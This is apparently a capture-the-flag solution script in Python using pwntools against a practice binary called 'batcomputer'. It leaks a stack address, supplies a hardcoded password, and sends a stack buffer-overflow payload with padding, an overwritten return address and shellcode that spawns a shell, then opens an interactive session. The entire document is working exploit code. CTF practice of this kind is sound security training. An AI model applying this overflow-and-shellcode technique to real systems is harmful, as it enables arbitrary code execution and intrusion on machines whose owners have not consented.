
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

password = 'b4tp@$$w0rd!'
ret_offset = 84

log.info('Start Process')
io = process('/home/kali/Downloads/batcomputer')

log.info('Get Stack Address')
io.sendlineafter('> ', '1')
stack_address = io.recvline().strip().split()[-1]
stack_address = ''.join([chr(int(stack_address[i: i+2], 16)) for i in range(2, len(stack_address), 2)])
stack_address = stack_address.rjust(8, '\x00')
stack_address = u64(stack_address)
log.success(f'Leaked stack address: {p64(stack_address)}')

log.info('Send Password')
io.sendlineafter('> ', '2')
io.sendlineafter('password: ', password)

log.info('Send payload')
padding = b'A' * ret_offset
shellcode = asm(shellcraft.sh())
payload = padding + p64(stack_address + ret_offset + 8) + shellcode
io.sendlineafter('commands: ', payload)

log.info('Trigger Return')
io.sendlineafter('> ', '3')

io.interactive()
